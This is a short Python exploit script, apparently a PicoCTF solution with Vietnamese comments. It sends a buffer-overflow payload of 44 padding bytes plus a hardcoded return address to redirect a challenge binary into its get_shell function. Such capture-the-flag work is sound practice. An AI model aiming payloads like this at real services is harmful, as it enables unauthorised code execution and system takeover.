#!/usr/bin/env python3

import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument(
	"host",
	type=str,
	help="Hostname or IP address to connect")

parser.add_argument(
	"port",
	type=int,
	help="Number of port to connect")

args = parser.parse_args() #Ta da tao duoc command-line de nhap input IP va Port

get_win = b"\xf6\x91\x04\x08" # Các byte địa chỉ get_shell dạng Little Endian
payload = (b"a"*44 + get_win + b"\n")   # Input sẽ nhập, X là độ dài đủ để buffer overflow và 4 byte get_shell nằm ở vị trí ret-addr


with socket.socket() as connection:
	#Ket noi vao chall cua PicoCTF	
	connection.connect((args.host, args.port))
	#In ra ket qua nhan duoc
	print(connection.recv(4096).decode("utf-8"))
	#Gui Payload
	connection.send(payload)
	#In ra ket qua nhan duoc
	print(connection.recv(4096).decode("utf-8"))
	print(connection.recv(4096).decode("utf-8"))
